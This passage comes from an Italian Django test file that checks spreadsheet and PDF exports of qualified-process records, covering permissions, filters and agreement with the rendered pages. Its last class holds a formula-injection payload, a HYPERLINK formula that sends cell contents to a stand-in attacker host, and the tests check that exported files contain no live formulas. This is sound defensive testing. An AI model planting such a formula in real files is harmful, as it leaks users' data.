            riferimento_dichiarazione="DICH-2026-01",
        )
        self.proc_sospeso = ProcessoQualificato.objects.create(
            nome="Saldatura speciale", cliente=self.ente_gamma,
            regime=ProcessoQualificato.REGIME_SPECIALE,
            stato=ProcessoQualificato.STATO_SOSPESO,
            tipo_validita=ProcessoQualificato.VALIDITA_ILLIMITATA,
        )

        # Persone abilitate: un qualificatore esterno (nominativo) e un interno
        # non risolvibile (fallback «#<id>», come in pagina).
        ab_est = AbilitazioneProcesso.objects.create(
            processo=self.proc_attivo, legacy_anagrafica_id=0,
            nominativo_esterno="Qualificatore Esterno Test",
            is_qualificato=True, is_controllore=True,
        )
        AbilitazioneProcesso.objects.create(
            processo=self.proc_attivo, legacy_anagrafica_id=99001,
            is_qualificato=True, is_addetto=True,
        )
        # Abilitazione non attiva: la pagina non la elenca → nemmeno l'export.
        AbilitazioneProcesso.objects.create(
            processo=self.proc_attivo, legacy_anagrafica_id=99002,
            is_qualificato=True, stato=AbilitazioneProcesso.STATO_REVOCATA,
        )
        CertificazioneIndividuale.objects.create(
            abilitazione=ab_est, schema="NDT", numero="C-001",
            data_scadenza="2026-11-30",
        )

        self.admin = User.objects.create_superuser("admin_mpq", "mpq@example.invalid", "x")
        self.plain = User.objects.create_user("mpq_plain", "plain@example.invalid", "x")
        UserOnboarding.objects.create(user=self.plain, completed=True)
        self.client.force_login(self.admin)

    def _request(self, path: str = "/anagrafica/mod128/vista/", user=None):
        request = RequestFactory().get(path)
        request.user = user or self.admin
        return request

    def _export_url(self, key: str, **params) -> str:
        url = reverse("anagrafica:export", args=[key])
        return url + "?" + "&".join(f"{k}={v}" for k, v in params.items())

    # -- endpoint -----------------------------------------------------------
    def test_every_mpq_key_is_registered(self):
        for key in self.MPQ_KEYS:
            self.assertIn(key, EXPORT_SPECS)

    def test_xlsx_export_ok_for_every_key(self):
        for key in self.MPQ_KEYS:
            with self.subTest(key=key):
                resp = self.client.get(self._export_url(key, format="xlsx"))
                self.assertEqual(resp.status_code, 200)
                self.assertEqual(resp["Content-Type"], XLSX_CT)
                self.assertIn(key, resp["Content-Disposition"])

    def test_pdf_export_ok_for_every_key(self):
        for key in self.MPQ_KEYS:
            with self.subTest(key=key):
                resp = self.client.get(self._export_url(key, format="pdf"))
                self.assertEqual(resp.status_code, 200)
                self.assertEqual(resp["Content-Type"], "application/pdf")
                self.assertTrue(resp.content.startswith(b"%PDF"))

    def test_audit_written_with_the_right_key(self):
        for key in self.MPQ_KEYS:
            with self.subTest(key=key):
                self.client.get(self._export_url(key, format="xlsx"))
                log = AuditLog.objects.filter(azione="export").latest("id")
                self.assertEqual(log.modulo, "anagrafica")
                self.assertEqual(log.dettaglio.get("lista"), key)

    def test_columns_are_filled_by_every_dataset(self):
        for key in self.MPQ_KEYS:
            with self.subTest(key=key):
                spec = EXPORT_SPECS[key]
                rows = spec.dataset(self._request(), "full")
                self.assertTrue(rows)
                accessors = {accessor for _label, accessor in spec.columns}
                for row in rows:
                    self.assertEqual(accessors - set(row), set())

    # -- gate ACL + permesso canonico MPQ ------------------------------------
    def test_denied_without_mpq_permission(self):
        """In dev/test l'ACL di rotta è neutra (`LEGACY_AUTH_ENABLED=False`): il
        deny reale è il permesso canonico MPQ. Un utente autenticato senza grant
        (né superuser né admin legacy) prende 403 su entrambe le liste."""
        self.client.force_login(self.plain)
        for key in self.MPQ_KEYS:
            with self.subTest(key=key):
                resp = self.client.get(self._export_url(key, format="xlsx"))
                self.assertEqual(resp.status_code, 403)

    def test_gate_uses_view_for_vista_and_manage_for_clienti(self):
        """La lista clienti è gated `.manage` (come `views_mpq.mpq_cliente_list`),
        la vista `.view`: il gate dell'export usa gli stessi codici canonici."""
        from unittest.mock import patch

        from anagrafica.acl_bootstrap import PERM_MPQ_MANAGE, PERM_MPQ_VIEW

        for key, expected in (("mpq_vista", PERM_MPQ_VIEW), ("mpq_clienti", PERM_MPQ_MANAGE)):
            with self.subTest(key=key):
                with patch("anagrafica.views_mpq._check_mpq_permission", return_value=True) as m:
                    self.assertTrue(EXPORT_SPECS[key].permission(self._request()))
                self.assertEqual(m.call_args.args[1], expected)

    # -- vista MOD.128: scope filtered vs full -------------------------------
    def test_vista_filtered_scope_reduces_rows(self):
        spec = EXPORT_SPECS["mpq_vista"]
        request = self._request("/anagrafica/mod128/vista/")
        # `full` = tutto il registro (sospesi compresi); `filtered` = default della
        # pagina (solo attivi).
        self.assertEqual(len(spec.dataset(request, "full")), 3)
        filtered = spec.dataset(request, "filtered")
        self.assertEqual(
            sorted(r["processo"] for r in filtered),
            ["Controllo non distruttivo", "Trattamento termico"],
        )
        self.assertIn("Solo processi attivi", spec.filters_label(request))

    def test_vista_tutti_and_cliente_filters(self):
        spec = EXPORT_SPECS["mpq_vista"]
        request = self._request("/anagrafica/mod128/vista/?tutti=1")
        self.assertEqual(len(spec.dataset(request, "filtered")), 3)
        self.assertIn("Tutti gli stati", spec.filters_label(request))

        request = self._request(
            f"/anagrafica/mod128/vista/?tutti=1&cliente={self.ente_gamma.pk}"
        )
        filtered = spec.dataset(request, "filtered")
        self.assertEqual([r["processo"] for r in filtered], ["Saldatura speciale"])
        self.assertEqual(filtered[0]["cliente"], "Ente Gamma")
        self.assertIn("Ente Gamma", spec.filters_label(request))

    def test_vista_rows_mirror_the_page(self):
        rows = {
            r["processo"]: r
            for r in EXPORT_SPECS["mpq_vista"].dataset(self._request(), "filtered")
        }
        att = rows["Trattamento termico"]
        self.assertEqual(att["cliente"], "Cliente Alpha")
        self.assertEqual(att["regime"], "NADCAP")
        self.assertEqual(att["livello"], "LVL2")
        self.assertEqual(att["stato"], "Attivo")
        self.assertEqual(att["riferimenti"], "APPR-001")
        self.assertEqual(att["reparti"], "Officina Test")
        # Solo le abilitazioni ATTIVE, come in pagina (la revocata non compare).
        self.assertEqual(att["qualificato"], "Qualificatore Esterno Test; #99001")
        self.assertEqual(att["addetto"], "#99001")
        self.assertEqual(att["controllore"], "Qualificatore Esterno Test")
        self.assertEqual(att["part145"], "")
        self.assertIn("Processo: 31-12-2026", att["scadenze"])
        self.assertIn("Qualificatore Esterno Test · NDT C-001: 30-11-2026", att["scadenze"])

    def test_vista_organizzativo_keeps_names_out(self):
        """Personale organizzativo: in pagina le 4 colonne di ruolo collassano nel
        rimando alla dichiarazione → l'export non espone nominativi."""
        rows = {
            r["processo"]: r
            for r in EXPORT_SPECS["mpq_vista"].dataset(self._request(), "filtered")
        }
        org = rows["Controllo non distruttivo"]
        self.assertEqual(org["qualificato"], "DICH-2026-01")
        self.assertEqual(org["addetto"], "")
        self.assertEqual(org["controllore"], "")
        self.assertEqual(org["part145"], "")

    # -- anti-drift: export ↔ righe RENDERIZZATE dalla pagina -----------------
    def test_vista_export_matches_rows_actually_rendered_by_the_page(self):
        for querystring in ("", "?tutti=1", f"?cliente={self.cliente_a.pk}",
                            f"?tutti=1&cliente={self.ente_gamma.pk}"):
            with self.subTest(querystring=querystring):
                resp = self.client.get(reverse("anagrafica:mpq_vista") + querystring)
                self.assertEqual(resp.status_code, 200)
                page_rows = [
                    (g["cliente"], r["processo"])
                    for g in resp.context["gruppi"] for r in g["righe"]
                ]
                export_rows = EXPORT_SPECS["mpq_vista"].dataset(
                    self._request(f"/anagrafica/mod128/vista/{querystring}"), "filtered"
                )
                self.assertEqual(
                    page_rows, [(r["cliente"], r["processo"]) for r in export_rows]
                )

    def test_vista_view_context_is_unchanged_by_the_extraction(self):
        """Non-regressione: contatori e tendine della pagina restano quelli di prima."""
        resp = self.client.get(reverse("anagrafica:mpq_vista"))
        self.assertEqual(resp.status_code, 200)
        self.assertEqual(resp.context["n_processi"], 2)      # solo attivi (default)
        self.assertTrue(resp.context["solo_attivi"])
        self.assertEqual(resp.context["cliente_sel"], "")
        # Tendina clienti: solo attivi, pre-filtro (Ente Gamma è disattivo).
        self.assertEqual(
            [c.nome for c in resp.context["clienti"]], ["Cliente Alpha", "Organismo Beta"]
        )

        resp = self.client.get(reverse("anagrafica:mpq_vista") + "?tutti=1")
        self.assertEqual(resp.context["n_processi"], 3)
        self.assertFalse(resp.context["solo_attivi"])

    # -- clienti / enti qualificanti -----------------------------------------
    def test_clienti_rows_mirror_the_page(self):
        rows = EXPORT_SPECS["mpq_clienti"].dataset(self._request(), "full")
        by_nome = {r["nome"]: r for r in rows}
        self.assertEqual(len(rows), 3)
        self.assertEqual(by_nome["Cliente Alpha"]["tipo"], "Cliente")
        self.assertEqual(by_nome["Cliente Alpha"]["codice"], "ALPHA")
        self.assertEqual(by_nome["Cliente Alpha"]["certificatore"], "")
        self.assertEqual(by_nome["Cliente Alpha"]["attivo"], "Sì")
        self.assertEqual(by_nome["Ente Gamma"]["tipo"], "Ente esterno")
        self.assertEqual(by_nome["Ente Gamma"]["certificatore"], "Organismo Beta")
        self.assertEqual(by_nome["Ente Gamma"]["attivo"], "No")

    def test_clienti_export_matches_rows_rendered_by_the_page(self):
        resp = self.client.get(reverse("anagrafica:mpq_cliente_list"))
        self.assertEqual(resp.status_code, 200)
        page_nomi = [c.nome for c in resp.context["clienti"]]
        export_nomi = [
            r["nome"] for r in EXPORT_SPECS["mpq_clienti"].dataset(
                self._request("/anagrafica/mod128/clienti/"), "filtered"
            )
        ]
        self.assertEqual(page_nomi, export_nomi)

    # -- UI: menu export nella toolbar ---------------------------------------
    def test_mpq_pages_show_the_export_menu(self):
        pages = {
            "mpq_vista": "anagrafica:mpq_vista",
            "mpq_clienti": "anagrafica:mpq_cliente_list",
        }
        for key, route in pages.items():
            with self.subTest(key=key):
                resp = self.client.get(reverse(route))
                self.assertEqual(resp.status_code, 200)
                html = resp.content.decode()
                base = reverse("anagrafica:export", args=[key])
                self.assertIn("Esporta", html)
                self.assertIn('href="#i-download"', html)
                self.assertIn(f'{base}?format=xlsx&amp;scope=filtered"', html)
                self.assertIn(f'{base}?format=pdf&amp;scope=full"', html)

    def test_vista_page_propagates_querystring_on_filtered_links(self):
        resp = self.client.get(reverse("anagrafica:mpq_vista") + "?tutti=1")
        self.assertEqual(resp.status_code, 200)
        html = resp.content.decode()
        base = reverse("anagrafica:export", args=["mpq_vista"])
        self.assertIn(f'{base}?format=xlsx&amp;scope=filtered&amp;tutti=1"', html)
        self.assertIn(f'{base}?format=pdf&amp;scope=full"', html)


@override_settings(LEGACY_AUTH_ENABLED=False, SECURE_SSL_REDIRECT=False)
class ExportFormulaInjectionEndToEndTests(TestCase):
    """SICUREZZA end-to-end: il .xlsx scaricato non contiene MAI formule vive.

    Due canali di iniezione, entrambi coperti:
      • la querystring (``?q=…``), riflessa nell'etichetta filtri in intestazione:
        basterebbe far cliccare a un utente HR un link preparato ad arte (oggi
        ogni ``filters_label`` antepone un prefisso — `Ricerca: "…"` — ma la
        garanzia non deve dipendere da quel dettaglio di formattazione);
      • i testi liberi del DB (qui il nome e la descrizione di una mansione).
    """

    PAYLOAD = '=HYPERLINK("http://evil.invalid/?"&A2,"apri")'

    def setUp(self):
        self.admin = User.objects.create_superuser("admin_inj", "inj@example.invalid", "x")
        self.client.force_login(self.admin)
        Mansione.objects.create(
            # Il nome contiene il payload (così la ricerca malevola lo intercetta),
            # la descrizione lo porta in testa alla cella: entrambi testi liberi da DB.
            nome=f"Addetto verniciatura {self.PAYLOAD}",
            livello_rischio=Mansione.RISCHIO_ALTO,
            descrizione=self.PAYLOAD,
        )

    def _sheet(self, content: bytes):
        from io import BytesIO

        from openpyxl import load_workbook

        return load_workbook(BytesIO(content)).active

    def _sheet_xml(self, content: bytes) -> bytes:
        import zipfile
        from io import BytesIO

        with zipfile.ZipFile(BytesIO(content)) as zf:
            return zf.read("xl/worksheets/sheet1.xml")

    def test_malicious_querystring_does_not_produce_a_live_formula(self):
        from urllib.parse import urlencode

        url = (
            reverse("anagrafica:export", args=["mansioni"])
            + "?format=xlsx&scope=filtered&"
            + urlencode({"q": self.PAYLOAD})
        )
        resp = self.client.get(url)
        self.assertEqual(resp.status_code, 200)
        self.assertEqual(resp["Content-Type"], XLSX_CT)

        ws = self._sheet(resp.content)
        # L'etichetta filtri (riga 5) riflette la querystring: deve restare TESTO.
        self.assertIn(self.PAYLOAD, str(ws["A5"].value))
        self.assertNotEqual(ws["A5"].data_type, "f")
        # La ricerca malevola intercetta la mansione: la riga dati è nel file…
        self.assertEqual(ws.cell(row=8, column=4).value, self.PAYLOAD)
        # …e nessuna cella del foglio è una formula viva.
        self.assertNotIn(b"<f>", self._sheet_xml(resp.content))
        for row in ws.iter_rows():
            for cell in row:
                self.assertNotEqual(cell.data_type, "f")

    def test_db_text_starting_with_equals_does_not_produce_a_live_formula(self):
        resp = self.client.get(
            reverse("anagrafica:export", args=["mansioni"]) + "?format=xlsx&scope=full"
        )
        self.assertEqual(resp.status_code, 200)
        ws = self._sheet(resp.content)
        # Colonna «Descrizione» = 4ª colonna, prima riga dati (riga 8).
        cell = ws.cell(row=8, column=4)
        self.assertEqual(cell.value, self.PAYLOAD)
        self.assertNotEqual(cell.data_type, "f")
        self.assertNotIn(b"<f>", self._sheet_xml(resp.content))
